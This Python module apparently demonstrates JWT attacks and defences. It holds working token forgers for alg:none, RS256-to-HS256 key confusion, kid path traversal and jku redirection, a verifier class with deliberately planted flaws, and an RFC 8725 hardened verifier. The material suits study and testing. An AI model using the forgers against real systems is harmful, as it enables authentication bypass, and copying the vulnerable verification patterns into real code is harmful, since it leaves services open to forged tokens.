"""JWT cryptographic vulnerability demonstrators and RFC 8725 defense verifiers.

Implements exploit generators for alg: none, RS256-to-HS256 key confusion,
unvalidated kid path traversal, and jku/x5u SSRF, paired with hardened
RFC 8725 verifiers using PyJWT 2.15.1 and joserfc 1.8.0.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import ipaddress
import json
import re
from typing import TYPE_CHECKING, Any, cast
from urllib.parse import urlparse

import joserfc.jwt
import jwt
from joserfc.jws import JWSRegistry

if TYPE_CHECKING:
    from pathlib import Path


def b64url_encode(data: bytes) -> str:
    """Encode bytes to RFC 7515 URL-safe base64 without padding."""
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def b64url_decode(segment: str) -> bytes:
    """Decode RFC 7515 URL-safe base64 string with missing padding restored."""
    rem = len(segment) % 4
    if rem > 0:
        segment += "=" * (4 - rem)
    return base64.urlsafe_b64decode(segment.encode("ascii"))


def forge_alg_none_token(
    claims: dict[str, Any],
    header_overrides: dict[str, Any] | None = None,
) -> str:
    """Construct an Unsecured JWT per RFC 7519 Section 6 (alg: none, empty signature)."""
    header = {"alg": "none", "typ": "JWT"}
    if header_overrides:
        header.update(header_overrides)
    hdr_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    pay_b64 = b64url_encode(json.dumps(claims, separators=(",", ":")).encode("utf-8"))
    return f"{hdr_b64}.{pay_b64}."


def forge_rs256_to_hs256_token(
    claims: dict[str, Any],
    rsa_public_key_pem: bytes,
    header_overrides: dict[str, Any] | None = None,
) -> str:
    """Exploit RS256-to-HS256 key confusion by signing with HMAC-SHA256 using RSA public key PEM."""
    header = {"alg": "HS256", "typ": "JWT"}
    if header_overrides:
        header.update(header_overrides)
    hdr_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    pay_b64 = b64url_encode(json.dumps(claims, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{hdr_b64}.{pay_b64}".encode("ascii")
    sig = hmac.new(rsa_public_key_pem, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{hdr_b64}.{pay_b64}.{sig_b64}"


def forge_kid_traversal_token(
    claims: dict[str, Any],
    traversal_kid: str,
    secret_bytes: bytes,
    header_overrides: dict[str, Any] | None = None,
) -> str:
    """Craft an HMAC-SHA256 token whose kid header targets an arbitrary filesystem path."""
    header = {"alg": "HS256", "typ": "JWT", "kid": traversal_kid}
    if header_overrides:
        header.update(header_overrides)
    hdr_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    pay_b64 = b64url_encode(json.dumps(claims, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{hdr_b64}.{pay_b64}".encode("ascii")
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{hdr_b64}.{pay_b64}.{sig_b64}"


def forge_jku_token(
    claims: dict[str, Any],
    jku_url: str,
    private_key_pem: bytes,
    kid: str = "attacker-key-1",
) -> str:
    """Craft a token signed by an attacker key, directing verifier to an untrusted jku URL."""
    return jwt.encode(
        claims,
        private_key_pem,
        algorithm="RS256",
        headers={"jku": jku_url, "kid": kid, "typ": "JWT"},
    )


class VulnerableJwtVerifier:
    """Demonstrates vulnerable JWT verification patterns prior to RFC 8725 compliance."""

    def __init__(self, key_store_dir: Path | None = None, rsa_public_pem: bytes | None = None):
        self.key_store_dir = key_store_dir
        self.rsa_public_pem = rsa_public_pem

    def verify_dynamic_algorithm(self, token: str) -> dict[str, Any]:
        """Vulnerability 1: Dynamically trusts header alg without an allowlist."""
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Malformed token")
        header_data = json.loads(b64url_decode(parts[0]))
        if not isinstance(header_data, dict):
            raise ValueError("Header must be a JSON object")
        header: dict[str, Any] = cast("dict[str, Any]", header_data)
        payload_data = json.loads(b64url_decode(parts[1]))
        if not isinstance(payload_data, dict):
            raise ValueError("Payload must be a JSON object")
        payload = cast("dict[str, Any]", payload_data)
        alg: Any = header.get("alg")

        if alg == "none":
            # Bug: trusts alg: none without signature validation
            return payload

        if alg == "HS256" and self.rsa_public_pem:
            # Bug: Key confusion: evaluates HS256 using asymmetric public key as secret
            signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
            expected_sig = hmac.new(self.rsa_public_pem, signing_input, hashlib.sha256).digest()
            actual_sig = b64url_decode(parts[2])
            if hmac.compare_digest(expected_sig, actual_sig):
                return payload
            raise ValueError("Signature verification failed")

        raise ValueError(f"Unsupported algorithm: {alg}")

    def resolve_key_path_vulnerable(self, kid: str) -> bytes:
        """Vulnerability 2: Concatenates untrusted kid directly into filesystem path."""
        if self.key_store_dir is None:
            raise ValueError("Key store directory not configured")
        # Direct concatenation allows ../ path traversal
        key_file = self.key_store_dir / kid
        with open(key_file, "rb") as f:
            return f.read()


class RFC8725HardenedVerifier:
    """RFC 8725 compliant JWT verifier implementing defense-in-depth protections."""

    def __init__(
        self,
        allowed_algorithms: list[str],
        allowed_issuers: list[str] | None = None,
        allowed_audiences: list[str] | None = None,
        expected_type: str | None = "at+jwt",
        key_store_dir: Path | None = None,
        allowed_jku_domains: list[str] | None = None,
    ):
        if not allowed_algorithms or "none" in allowed_algorithms:
            raise ValueError("RFC 8725 Section 3.1: allowed_algorithms must not include 'none'")
        self.allowed_algorithms = allowed_algorithms
        self.allowed_issuers = allowed_issuers or []
        self.allowed_audiences = allowed_audiences or []
        self.expected_type = expected_type
        self.key_store_dir = key_store_dir.resolve() if key_store_dir else None
        self.allowed_jku_domains = allowed_jku_domains or []

    def safe_resolve_kid_path(self, kid: str) -> Path:
        """Enforces RFC 8725 Section 3.10 safe kid handling against path traversal."""
        if not self.key_store_dir:
            raise ValueError("Key store directory not configured")
        # Strict alphanumeric regex enforcement
        if not re.fullmatch(r"^[a-zA-Z0-9_\-]{1,64}$", kid):
            raise ValueError(f"RFC 8725 Section 3.10: invalid kid format: {kid}")

        resolved_path = (self.key_store_dir / kid).resolve()
        if not resolved_path.is_relative_to(self.key_store_dir):
            raise ValueError(f"RFC 8725 Section 3.10: kid path traversal detected: {kid}")
        if not resolved_path.is_file():
            raise FileNotFoundError(f"Key file not found: {kid}")
        return resolved_path

    def safe_validate_jku(self, jku_url: str) -> str:
        """Enforces RFC 8725 Section 3.10 safe jku handling against SSRF."""
        parsed = urlparse(jku_url)
        if parsed.scheme != "https":
            raise ValueError("RFC 8725 Section 3.10: jku must use https scheme")
        if not parsed.hostname:
            raise ValueError("RFC 8725 Section 3.10: jku missing hostname")

        # Reject IP literals outside the global unicast space: loopback, link-local,
        # RFC 1918 private, unique-local IPv6, and so on. This check sees only the
        # literal in the URL; a DNS name that resolves to a private address is
        # stopped by the allowlist below, not here.
        literal: ipaddress.IPv4Address | ipaddress.IPv6Address | None
        try:
            literal = ipaddress.ip_address(parsed.hostname)
        except ValueError:
            literal = None
        if parsed.hostname == "localhost" or (literal is not None and not literal.is_global):
            raise ValueError(f"RFC 8725 Section 3.10: jku SSRF target blocked: {parsed.hostname}")

        if parsed.hostname not in self.allowed_jku_domains:
            raise ValueError(
                f"RFC 8725 Section 3.10: jku domain {parsed.hostname} not in allowlist"
            )

        return jku_url

    def verify_with_pyjwt(
        self,
        token: str,
        verification_key: Any,
    ) -> dict[str, Any]:
        """Verify token using PyJWT 2.15.1 under RFC 8725 constraints."""
        # Check explicit typing before full decode if required
        header = jwt.get_unverified_header(token)
        alg = header.get("alg")
        if alg not in self.allowed_algorithms:
            raise ValueError(f"RFC 8725 Section 3.1: algorithm '{alg}' not in allowlist")

        if self.expected_type is not None:
            typ = header.get("typ")
            if typ != self.expected_type:
                raise ValueError(
                    f"RFC 8725 Section 3.11: token type '{typ}' does not match "
                    f"expected '{self.expected_type}'"
                )

        options: dict[str, Any] = {
            "verify_signature": True,
            "require": ["exp"],
        }
        kwargs: dict[str, Any] = {
            "algorithms": self.allowed_algorithms,
            "options": options,
        }
        if self.allowed_issuers:
            kwargs["issuer"] = self.allowed_issuers
        if self.allowed_audiences:
            kwargs["audience"] = self.allowed_audiences

        try:
            return jwt.decode(token, key=verification_key, **kwargs)
        except (jwt.PyJWTError, ValueError) as err:
            raise ValueError(f"JWT verification failed: {err}") from err

    def verify_with_joserfc(
        self,
        token: str,
        verification_key: Any,
    ) -> dict[str, Any]:
        """Verify token using joserfc 1.8.0 under RFC 8725 constraints."""
        registry = JWSRegistry(algorithms=self.allowed_algorithms)
        decoded = joserfc.jwt.decode(
            token,
            verification_key,
            algorithms=self.allowed_algorithms,
            registry=registry,
        )

        if self.expected_type is not None:
            typ = decoded.header.get("typ")
            if typ != self.expected_type:
                raise ValueError(
                    f"RFC 8725 Section 3.11: token type '{typ}' does not match "
                    f"expected '{self.expected_type}'"
                )

        return decoded.claims
